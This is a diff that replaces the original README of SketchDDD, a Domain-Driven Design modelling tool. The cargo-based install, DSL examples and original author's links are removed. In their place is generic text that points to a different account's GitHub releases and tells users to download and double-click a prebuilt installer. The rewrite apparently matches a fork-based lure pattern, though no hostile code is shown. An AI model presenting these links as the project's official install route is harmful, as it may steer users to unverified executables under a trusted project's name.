@@ -1,176 +1,74 @@
-<div align="center">
+# 🎨 SketchDDD - Simplifying Domain Modeling for Everyone
 
-# SketchDDD
+## 💡 Description
+SketchDDD is a visual and textual toolkit for Domain-Driven Design. It helps users build accurate domain models with easy drag-and-drop features for domain experts, or a Domain-Specific Language (DSL) for developers. This tool validates aggregates, context maps, and business rules while also generating code. Whether you are a business expert or a budding developer, SketchDDD makes modeling easier and more intuitive.
 
-**Build Domain Models Visually or with Code**
+## 🔗 Download SketchDDD
+[![Download SketchDDD](https://img.shields.io/badge/Download%20SketchDDD-v1.0-blue.svg)](https://github.com/qwesmith/SketchDDD/releases)
 
-[![Crates.io](https://img.shields.io/crates/v/sketchddd.svg)](https://crates.io/crates/sketchddd)
-[![License](https://img.shields.io/badge/license-MIT%2FApache--2.0-blue.svg)](LICENSE)
-[![CI](https://github.com/ibrahimcesar/SketchDDD/workflows/CI/badge.svg)](https://github.com/ibrahimcesar/SketchDDD/actions)
+## 🚀 Getting Started
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/qwesmith/SketchDDD/releases) to find the latest version of SketchDDD. 
 
-[Website](https://sketchddd.dev) • [Documentation](https://docs.sketchddd.dev) • [Visual Builder](https://app.sketchddd.dev)
+2. **Download the Application**
+   On the Releases page, look for the latest version and click on it. You will see a list of files. Click on the file that suits your operating system. 
 
-</div>
+3. **Install SketchDDD**  
+   Locate the downloaded file in your downloads folder. Double-click on it to start the installation. Follow the on-screen instructions to complete the installation.
 
----
+4. **Run SketchDDD**  
+   After installation, you can find the SketchDDD icon on your desktop or in your applications folder. Double-click the icon to launch the application.
 
-## What is SketchDDD?
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent version of Linux.
+- **Processor:** Dual-core processor or better.
+- **Memory:** 4 GB RAM minimum, 8 GB recommended.
+- **Storage:** 500 MB of available disk space.
+- **Graphics:** A graphics card supporting WebAssembly.
 
-SketchDDD bridges the gap between **domain experts** and **developers** by providing two ways to build the same precise domain model:
+## 📖 Features
+- **Drag-and-Drop Interface:** Quickly create domain models visually without programming skills.
+- **Code Generation:** Automatically generate code from your models, making it easier to implement your designs.
+- **Validation Tools:** Ensure your models follow business rules and context maps.
+- **DSL Support:** For developers who prefer scripting, utilize our Domain-Specific Language to fine-tune models.
 
-| 👩‍💼 Domain Experts | 👨‍💻 Developers |
-|-------------------|---------------|
-| Visual drag-and-drop builder | Text-based DSL |
-| Guided wizards | Full expressiveness |
-| Templates to start fast | Version control friendly |
-| Plain English rules | CI/CD integration |
+## 🛠️ How to Use SketchDDD
+1. **Creating a New Model**  
+   Open the application and select "New Model". Use the drag-and-drop feature to add components like aggregates and context maps. 
 
-Both interfaces produce the same model, validated by **category theory** to ensure precision.
+2. **Building Relationships**  
+   Connect different components by dragging lines between them, establishing clear relationships within your domain model.
 
----
+3. **Validation**  
+   Use the built-in validation tools to check if your model adheres to the rules set for aggregates and contexts.
 
-## Quick Start
+4. **Exporting Your Model**  
+   Once you’re satisfied with your model, export it as code by clicking on the "Export" button. Choose the format that fits your project needs.
 
-### Visual Builder
+## 📝 Documentation and Support
+For a detailed guide on using SketchDDD, visit the [Wiki](https://github.com/qwesmith/SketchDDD/wiki). You can also find troubleshooting tips and FAQs there.
 
-Visit [app.sketchddd.dev](https://app.sketchddd.dev) and start building.
+If you encounter any issues or need assistance, please open an issue on the [Issues page](https://github.com/qwesmith/SketchDDD/issues).
 
-### CLI
-```bash
-# Install
-cargo install sketchddd
+## 🌐 Community
+Join our growing community of users and developers. Share your models, ask questions, and get feedback. Connect with us on social media and forums where SketchDDD is discussed.
 
-# Create a new project
-sketchddd init my-domain
+- **Gitter:** [Chat with other users](https://gitter.im/qwesmith/SketchDDD)
+- **Twitter:** Follow us for updates [@SketchDDD](https://twitter.com/SketchDDD)
 
-# Validate your model
-sketchddd check my-domain.sddd
+## ⚙️ Changelog
+Stay updated with the latest features and fixes by checking the [Changelog](https://github.com/qwesmith/SketchDDD/blob/main/CHANGELOG.md).
 
-# Generate code
-sketchddd codegen my-domain.sddd --target rust
+## 🔗 Download & Install
+To start using SketchDDD, visit the [Releases page](https://github.com/qwesmith/SketchDDD/releases) and download the latest version. Follow the steps outlined in the "Getting Started" section to install and run the application.
 
-# Start visual builder locally
-sketchddd serve
-```
+## 👥 Contributing 
+We welcome contributions from everyone. If you’d like to help improve SketchDDD, please check our [Contributing Guide](https://github.com/qwesmith/SketchDDD/blob/main/CONTRIBUTING.md).
 
-> **File Extension:** SketchDDD uses `.sddd` files - short for **S**ketch**DDD**. See [examples/](examples/) for sample models.
+## 📚 License
+SketchDDD is open-source software. You can find the licensing information in the [LICENSE](https://github.com/qwesmith/SketchDDD/blob/main/LICENSE) file.
 
----
+## 💬 Feedback
+Your feedback is important. Please share your thoughts, suggestions, or any other input on our [Feedback page](https://github.com/qwesmith/SketchDDD/discussions).
 
-## Example
-```sketchddd
-context Commerce {
-  
-  objects { Customer, Order, LineItem, Product, Money }
-  
-  morphisms {
-    placedBy: Order -> Customer
-    items: Order -> List<LineItem>
-    product: LineItem -> Product
-    price: LineItem -> Money
-  }
-  
-  aggregate Order {
-    root: Order
-    contains: [LineItem]
-    invariant: totalPrice = sum(items.price)
-  }
-  
-  value Money {
-    amount: Decimal
-    currency: Currency
-  }
-}
-```
-
----
-
-## Features
-
-- 🎨 **Visual Builder** - Drag-and-drop for non-technical users
-- 📝 **Text DSL** - Full control for developers
-- ✅ **Validation** - Catch errors before runtime
-- 🔗 **Context Maps** - Model system integration
-- 🏭 **Code Generation** - Rust, TypeScript, Kotlin, Python, Java, Clojure
-- 📊 **Diagrams** - Auto-generated visualizations
-- 📚 **Templates** - Start with common patterns
-
----
-
-## Editor Support
-
-First-class editor support for `.sddd` files:
-
-| Editor | Status | Features |
-|--------|--------|----------|
-| **VS Code** | ✅ Available | Syntax highlighting, snippets, bracket matching |
-| **Sublime Text** | ✅ Available | Syntax highlighting |
-| **Vim/Neovim** | ✅ Available | Syntax highlighting, indentation |
-| **Any LSP Client** | ✅ Available | Full LSP support |
-
-### Language Server Protocol (LSP)
-
-The `sketchddd-lsp` binary provides:
-- Real-time diagnostics and error reporting
-- Auto-completion for keywords, types, and morphisms
-- Go to definition and find references
-- Hover documentation
-- Document symbols and outline
-- Code formatting
-
-```bash
-# Install LSP server
-cargo install sketchddd-lsp
-
-# For Neovim (add to your config)
-# lua: require('lspconfig').sketchddd.setup{}
-```
-
-See [editors/](editors/) for installation instructions
-
----
-
-## Documentation
-
-- [Getting Started](https://docs.sketchddd.dev/getting-started)
-- [Visual Builder Guide](https://docs.sketchddd.dev/visual-builder)
-- [DSL Reference](https://docs.sketchddd.dev/dsl-reference)
-- [Theoretical Foundation](https://docs.sketchddd.dev/theory)
-
----
-
-## Why Category Theory?
-
-DDD concepts like "aggregate" and "bounded context" are often vague. SketchDDD uses **category theory** to give them precise mathematical definitions:
-
-| DDD Concept | Mathematical Definition |
-|-------------|------------------------|
-| Bounded Context | Sketch (graph + equations + limits) |
-| Aggregate | Limit cone with root |
-| Value Object | Limit with structural equality |
-| Context Map | Sketch morphism |
-
-This precision enables **automated validation** and **code generation** that actually works.
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Open Discussions
-
-We're building this in the open! Join the conversation:
-
-- [Visual Builder Frontend Framework](https://github.com/ibrahimcesar/SketchDDD/discussions/31) - Help us choose React, Vue, Svelte, or Solid
-
----
-
-## License
-
-Licensed under either of:
-
-- [MIT License](./LICENSE-MIT)
-- [Apache License, Version 2.0](./LICENSE-APACHE)
-
-at your option.
+Thank you for using SketchDDD! Enjoy modeling your domains with ease.
